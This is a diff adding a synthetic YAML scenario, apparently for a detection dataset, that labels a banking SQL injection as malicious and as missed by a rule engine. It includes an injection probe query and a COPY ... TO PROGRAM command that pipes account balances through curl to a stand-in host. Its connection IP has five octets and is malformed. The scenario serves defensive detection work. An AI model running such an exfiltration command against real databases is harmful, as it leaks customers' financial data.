@@ -1,0 +1,33 @@
+scenario_id: gen_banking_58_sql_injection_mal_1541m
+family_id: gen_banking_58_sql_injection_fam_1541
+domain: banking
+time_of_day: 02:20
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: inject
+  role: batch_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 3.0
+  events:
+  - step_id: probe
+    sql: SELECT transaction_id, amount FROM transactions WHERE customer_id = 253744
+      AND (SELECT count(*) FROM accounts) > 0
+  - step_id: exfil
+    sql: COPY (SELECT balance FROM accounts) TO PROGRAM 'curl -sX POST https://clearinghouse-batch.example/ingest
+      -d @-'
+    connects_to:
+      ip: 185.220.101.50.175
+      port: 9443
+matched_pair_id: gen_banking_58_sql_injection_pair_1541
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
